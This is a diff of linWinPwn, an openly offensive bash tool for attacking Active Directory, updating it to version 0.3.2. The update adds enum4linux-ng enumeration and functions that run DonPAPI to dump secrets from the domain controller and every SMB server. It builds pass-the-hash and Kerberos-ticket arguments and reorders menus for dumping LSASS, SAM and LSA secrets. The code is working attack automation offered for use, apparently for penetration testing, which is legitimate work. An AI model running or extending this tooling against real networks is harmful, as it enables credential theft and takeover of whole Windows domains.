@@ -1,7 +1,7 @@
 #!/bin/bash
 # Title: linWinPwn
 # Author: lefayjey
-# Version: 0.3.1
+# Version: 0.3.2
 
 #Colors
 RED='\033[1;31m'
@@ -23,7 +23,7 @@ allservers_bool=true
 
 #Tools variables
 python=$(which python3)
-impacket_dir="/usr/share/doc/python3-impacket/examples/"
+impacket_dir="/usr/share/doc/python3-impacket/examples"
 bloodhound=$(which bloodhound-python)
 ldapdomaindump=$(which ldapdomaindump)
 crackmapexec=$(which crackmapexec)
@@ -34,6 +34,7 @@ kerbrute=$(which kerbrute)
 adidnsdump=$(which adidnsdump)
 certi_py=$(which certi.py)
 certipy=$(which certipy)
+donpapi_dir="/opt/DonPAPI-main"
 scripts_dir="./Scripts"
 
 #pass_list="./wordlists/rockyou.txt" #Non-Kali-variables
@@ -48,7 +49,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN} version 0.3.1
+      ${BLUE}linWinPwn: ${CYAN} version 0.3.2
       ${NC}https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -190,6 +191,7 @@ prepare (){
         argument_ldapdns="-u ${domain}\\${user} -p ${password}"
         argument_smbmap="-d ${domain} -u ${user} -p ${password}"
         argument_imp=" -hashes ${password} ${domain}/${user}"
+        argument_donpapi=" --hashes ${password} ${domain}/${user}"
         argument_bhd="-u ${user}@${domain} --hashes ${password}"
         argument_gMSA="-d ${domain} -u ${user} -p ${password}"
         argument_LRS="-u ${user} -nthash $(echo ${password} | cut -d ':' -f 2)"
@@ -205,6 +207,7 @@ prepare (){
         export KRB5CCNAME=$(realpath $password)
         argument_cme="-d ${domain} -u ${user} -k"
         argument_imp="-k -no-pass ${domain}/${user}"
+        argument_donpapi="-k -no-pass ${domain}/${user}"
         argument_bhd="-u ${user}@${domain} -k"
         argument_gMSA="-d ${domain} -u ${user} -k"
         argument_certipy="${domain}/${user}@${dc_FQDN} -k -no-pass"
@@ -220,11 +223,13 @@ prepare (){
         argument_ldapdns="-u ${domain}\\${user} -p ${password}"
         argument_smbmap="-d ${domain} -u ${user} -p ${password}"
         argument_imp="${domain}/${user}:${password}"
+        argument_donpapi="${domain}/${user}:${password}"
         argument_bhd="-u ${user}@${domain} -p ${password}"
         argument_windap="-u ${user}@${domain} -p ${password}"
         argument_gMSA="-d ${domain} -u ${user} -p ${password}"
         argument_LRS="-u ${user} -p ${password}"
         argument_certipy="${domain}/${user}:${password}@${target}"
+        argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
         auth_string="${YELLOW}[i]${NC} Authentication: password of ${user}"
     fi
 
@@ -388,6 +393,21 @@ windapsearch_enum () {
         echo ${dc_FQDN} >> ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
     fi
     echo -e ""
+}
+
+enum4linux_enum () {
+    if [ ! -f "${scripts_dir}/enum4linux-ng.py" ] ; then
+        echo -e "${RED}[-] Please verify the installation of enum4linux-ng${NC}"
+    else
+        echo -e "${BLUE}[*] enum4linux Enumeration${NC}"
+        if [ "${nullsess_bool}" == true ] ; then
+            ${python} ${scripts_dir}/enum4linux-ng.py -A ${dc_ip} | tee ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
+        elif [ "${kerb_bool}" == true ] || [ "${hash_bool}" == true ] ; then
+                echo -e "${PURPLE}[-] enum4linux does not support kerberos tickets nor PtH${NC}"
+        else
+            ${python} ${scripts_dir}/enum4linux-ng.py -A ${argument_enum4linux} ${dc_ip} | tee ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
+        fi
+    fi
 }
 
 ridbrute_attack () {
@@ -944,6 +964,41 @@ nanodump_dump () {
     echo -e ""
 }
 
+donpapi_dump_dc () {
+    if [ ! -f "${donpapi_dir}/DonPAPI.py" ] ; then
+        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
+    else
+        smb_scan
+
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
+        else
+            echo -e "${BLUE}[*] Dumping secrets from DC using DonPAPI${NC}"
+            ${python} ${donpapi_dir}/DonPAPI.py "${argument_donpapi}@${dc_ip}" -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${dc_ip}.txt
+        fi
+    fi
+    echo -e ""
+}
+
+donpapi_dump () {
+    if [ ! -f "${donpapi_dir}/DonPAPI.py" ] ; then
+        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
+    else
+        smb_scan
+
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
+        else
+            echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
+            for i in $(/bin/cat ${servers_smb_list}); do
+                echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
+                ${python} ${donpapi_dir}/DonPAPI.py "${argument_donpapi}@${i}" -dc-ip ${dc_ip} | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${i}.txt
+            done
+        fi
+    fi
+    echo -e ""
+}
+
 mssql_enum () {
     if [ ! -f "${scripts_dir}/windapsearch.py" ] || [ ! -f "${impacket_dir}/GetUserSPNs.py" ]; then
         echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
@@ -1019,6 +1074,7 @@ ad_enum () {
     bhd_enum
     ldapdomain_enum
     windapsearch_enum
+    enum4linux_enum
     ridbrute_attack
     users_enum
     passpol_enum
@@ -1054,6 +1110,7 @@ pwd_dump () {
     handlekatz_dump
     procdump_dump
     nanodump_dump
+    donpapi_dump
 }
 
 vuln_checks () {
@@ -1085,20 +1142,21 @@ ad_menu () {
     echo -e "2) BloodHound Enumeration using DCOnly"
     echo -e "3) ldapdomain Enumeration"
     echo -e "4) windapsearch Enumeration"
-    echo -e "5) RID Brute Force (Null session)"
-    echo -e "6) Users Enumeration (Null session)"
-    echo -e "7) Password Policy Enumeration"
-    echo -e "8) GPP Enumeration"
-    echo -e "9) Password not required Enumeration"
-    echo -e "10) ADCS Enumeration"
-    echo -e "11) Users Description containing word: pass"
-    echo -e "12) Get MachineAccountQuota"
-    echo -e "13) LDAP-signing check"
-    echo -e "14) Trusted-for-delegation check (cme)"
-    echo -e "15) Impacket findDelegation Enumeration"
-    echo -e "16) LdapRelayScan checks"
-    echo -e "17) certi.py Enumeration"
-    echo -e "18) Certipy Enumeration"
+    echo -e "5) enum4linux-ng Enumeration"
+    echo -e "6) RID Brute Force (Null session)"
+    echo -e "7) Users Enumeration (Null session)"
+    echo -e "8) Password Policy Enumeration"
+    echo -e "9) GPP Enumeration"
+    echo -e "10) Password not required Enumeration"
+    echo -e "11) ADCS Enumeration"
+    echo -e "12) Users Description containing word: pass"
+    echo -e "13) Get MachineAccountQuota"
+    echo -e "14) LDAP-signing check"
+    echo -e "15) Trusted-for-delegation check (cme)"
+    echo -e "16) Impacket findDelegation Enumeration"
+    echo -e "17) LdapRelayScan checks"
+    echo -e "18) certi.py Enumeration"
+    echo -e "19) Certipy Enumeration"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -1131,58 +1189,63 @@ ad_menu () {
         ;;
 
         5)
+        enum4linux_enum
+        ad_menu
+        ;;
+
+        6)
         ridbrute_attack
         ad_menu;;
 
-		6)
+		7)
         users_enum
         ad_menu;;
         
-        7)
+        8)
         passpol_enum
         ad_menu;;
 
-        8)
+        9)
         gpp_enum
         ad_menu;;
 
-        9)
+        10)
         passnotreq_enum
         ad_menu;;
 
-        10)
+        11)
         adcs_enum
         ad_menu;;
 
-        11)
+        12)
         passdesc_enum
         ad_menu;;
 
-        12)
+        13)
         macq_enum
         ad_menu;;
 
-        13)
+        14)
         ldapsign_enum
         ad_menu;;
 
-        14)
+        15)
         deleg_enum_cme
         ad_menu;;
 
-        15)
+        16)
         deleg_enum_imp
         ad_menu;;
 
-        16)
+        17)
         ldaprelay_dump
         ad_menu;;
 
-        17)
+        18)
         certi_py_enum
         ad_menu;;
 
-        18)
+        19)
         certipy_enum
         ad_menu;;
 
@@ -1419,21 +1482,24 @@ pwd_menu () {
     echo -e "4) Dump SAM from DC using crackmapexec"
     echo -e "5) Dump SAM from all domain servers using crackmapexec"
     echo -e "6) Dump SAM from custom list of servers using crackmapexec"
-    echo -e "7) Dump LSA secrets from all domain servers using crackmapexec"
-    echo -e "8) Dump LSA secrets from DC using crackmapexec"
+    echo -e "7) Dump LSA secrets from DC using crackmapexec"
+    echo -e "8) Dump LSA secrets from all domain servers using crackmapexec"
     echo -e "9) Dump LSA secrets from custom list of servers using crackmapexec"
-    echo -e "10) Dump LSASS from all domain servers using lsassy"
-    echo -e "11) Dump LSASS from DC using lsassy"
+    echo -e "10) Dump LSASS from DC using lsassy"
+    echo -e "11) Dump LSASS from all domain servers using lsassy"
     echo -e "12) Dump LSASS from custom list of servers using lsassy"
-    echo -e "13) Dump LSASS from all domain servers using handlekatz"
-    echo -e "14) Dump LSASS from DC using handlekatz"
+    echo -e "13) Dump LSASS from DC using handlekatz"
+    echo -e "14) Dump LSASS from all domain servers using handlekatz"
     echo -e "15) Dump LSASS from custom list of servers using handlekatz"
-    echo -e "16) Dump LSASS from all domain servers using procdump"
-    echo -e "17) Dump LSASS from DC using procdump"
+    echo -e "16) Dump LSASS from DC using procdump"
+    echo -e "17) Dump LSASS from all domain servers using procdump"
     echo -e "18) Dump LSASS from custom list of servers using procdump"
-    echo -e "19) Dump LSASS from all domain servers using nanodump"
-    echo -e "20) Dump LSASS from DC using nanodump"
+    echo -e "19) Dump LSASS from DC using nanodump"
+    echo -e "20) Dump LSASS from all domain servers using nanodump"
     echo -e "21) Dump LSASS from custom list of servers using nanodump"
+    echo -e "22) Dump secrets using DonPAPI from DC"
+    echo -e "23) Dump secrets using DonPAPI from all domain servers"
+    echo -e "24) Dump secrets using DonPAPI from custom list of servers"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -1578,6 +1644,27 @@ pwd_menu () {
 
         21)
         nanodump_dump
+        allservers_bool=false
+        if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
+            echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
+            read -p ">> " servers_list </dev/tty
+        fi
+        pwd_menu
+        ;;
+
+        22)
+        donpapi_dump_dc
+        pwd_menu
+        ;;
+
+        23)
+        donpapi_dump
+        allservers_bool=true
+        pwd_menu
+        ;;
+        
+        24)
+        donpapi_dump
         allservers_bool=false
         if [ ! -f ${servers_list} ] || [ -z ${servers_list} ]  ; then
             echo -e "${YELLOW}[i]${NC} Error finding custom servers list. Please specify file containing list of target servers:"
